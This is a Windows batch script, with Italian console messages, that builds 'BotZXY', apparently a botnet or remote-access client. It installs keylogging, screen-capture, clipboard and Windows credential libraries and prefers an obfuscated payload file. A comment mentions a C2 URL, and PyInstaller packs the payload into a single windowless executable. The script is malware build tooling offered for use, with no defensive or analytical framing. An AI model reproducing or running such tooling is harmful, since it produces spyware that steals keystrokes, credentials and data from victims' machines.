@echo off
title BotZXY Builder - Windows
color 0A

echo ========================================
echo   BotZXY - Windows Client Builder v2.1
echo ========================================
echo.

REM Verifica Python
echo [1/5] Verifica Python...
py -3.11 --version >nul 2>&1
if errorlevel 1 (
    echo [ERRORE] Python 3.11 non trovato!
    echo Installa Python 3.11 da python.org
    pause
    exit /b 1
)
echo [OK] Python 3.11 trovato

REM Verifica pip
echo.
echo [2/5] Verifica pip...
py -3.11 -m pip --version >nul 2>&1
if errorlevel 1 (
    echo [ERRORE] pip non trovato!
    pause
    exit /b 1
)
echo [OK] pip trovato

REM Installa/aggiorna dipendenze
echo.
echo [3/5] Installazione dipendenze...
py -3.11 -m pip install --upgrade pip
py -3.11 -m pip install pyinstaller==6.3.0 pyautogui opencv-python pillow requests keyboard pywin32 numpy

REM Controllo payload
echo.
echo [4/5] Controllo payload...
if not exist "payloads\windows_client.py" (
    echo [ERRORE] File payload non trovato: payloads\windows_client.py
    pause
    exit /b 1
)

REM Usa payload offuscato se esiste
set PAYLOAD=payloads\windows_client.py
if exist "payloads\windows_client_obf.py" (
    echo [INFO] Usando payload offuscato...
    set PAYLOAD=payloads\windows_client_obf.py
)

REM Compilazione con opzioni avanzate
echo.
echo [5/5] Compilazione EXE...
echo [INFO] Compilazione in corso, attendere...

REM Crea una copia temporanea con il C2_URL corretto
set TEMP_PAYLOAD=windows_temp.py
copy "%PAYLOAD%" "%TEMP_PAYLOAD%"

REM Compila con PyInstaller
py -3.11 -m PyInstaller ^
    --onefile ^
    --noconsole ^
    --name botzxy_client ^
    --add-data "%TEMP_PAYLOAD%;." ^
    --hidden-import keyboard ^
    --hidden-import pyautogui ^
    --hidden-import win32clipboard ^
    --hidden-import win32api ^
    --hidden-import win32con ^
    --hidden-import win32process ^
    --hidden-import win32cred ^
    --hidden-import sqlite3 ^
    --hidden-import cryptography ^
    --hidden-import _cffi_backend ^
    --collect-all pyautogui ^
    --collect-all keyboard ^
    --collect-all win32clipboard ^
    --collect-all win32api ^
    --collect-all win32con ^
    --collect-all win32process ^
    --collect-all win32cred ^
    --collect-all pillow ^
    --collect-all opencv ^
    --collect-all numpy ^
    --collect-all requests ^
    --collect-all cryptography ^
    "%TEMP_PAYLOAD%"

REM Rimuovi file temporaneo
del "%TEMP_PAYLOAD%" 2>nul

if errorlevel 1 (
    echo.
    echo [ERRORE] Compilazione fallita!
    echo.
    echo Possibili cause:
    echo   1. Python 3.11 non installato correttamente
    echo   2. Dipendenze mancanti
    echo   3. Visual C++ Redistributable non installato
    echo.
    pause
    exit /b 1
)

echo.
echo ========================================
echo   Build completato con successo!
echo   File: dist\botzxy_client.exe
echo ========================================

REM Mostra dimensione
if exist "dist\botzxy_client.exe" (
    for %%A in ("dist\botzxy_client.exe") do (
        set /a SIZE=%%~zA/1048576
        echo   Dimensione: !SIZE! MB
    )
) else (
    echo   [ERRORE] File non trovato!
)

echo.
echo [1] Crea copia di backup
echo [2] Esci
choice /C 12 /N /M "Scegli: "
if errorlevel 2 goto end
if errorlevel 1 (
    if exist "dist\botzxy_client.exe" (
        copy "dist\botzxy_client.exe" "dist\botzxy_client_backup.exe"
        echo [OK] Backup creato: dist\botzxy_client_backup.exe
    )
)

:end
echo.
pause